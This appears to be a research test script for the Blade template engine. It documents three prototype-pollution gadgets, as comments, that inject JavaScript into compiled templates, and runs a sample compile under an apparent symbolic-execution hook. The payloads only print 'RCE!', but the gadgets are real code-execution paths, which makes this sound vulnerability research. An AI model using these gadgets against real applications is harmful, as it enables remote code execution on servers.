const blade = require('blade');

// gadget 1
// Object.prototype.code = "console.log('RCE!')"
// Object.prototype.value = "somevalue" // helper property, bladejs/lib/parser/index.js::1316

// gadget 2
// Object.prototype.line = '1\nconsole.log("RCE!")\n'
// Object.prototype.value = "somevalue" // helper property, bladejs/lib/parser/index.js::1316

// gadget 3
// Object.prototype.templateNamespace = "[__=console.log('rce')?'':{}]"
// Object.prototype.value = "somevalue" // helper property, bladejs/lib/parser/index.js::1316

try{
    Object._expose.setupSymbols()
}
catch(e){
    console.log("[!] symbolic execution not enabled")
}


const template = `html
    head
        title Blade
    body
        #nav
            ul
                - for(var i in nav)
                    li
                        a(href=nav[i])= i
        #content.center
            h1 Blade is cool`;

blade.compile(template, {'debug': true}, function(err, tmpl) {
    console.log(err);
    tmpl({'nav': []}, function(err, html) {
        console.log(html, err);
    });
});